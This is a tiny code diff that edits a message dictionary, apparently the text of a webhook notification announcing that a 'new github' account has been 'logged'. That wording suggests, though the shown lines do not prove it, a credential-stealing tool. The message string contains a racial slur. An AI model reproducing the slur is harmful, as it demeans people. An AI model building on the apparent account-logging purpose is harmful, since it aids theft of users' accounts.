@@ -22,7 +22,7 @@ embed = {
 
 
 message = {
-    "content": "new github nigga logged...",
+    "content": "new github nigga logged... :skull:",
     "embeds": [embed],
 }
 
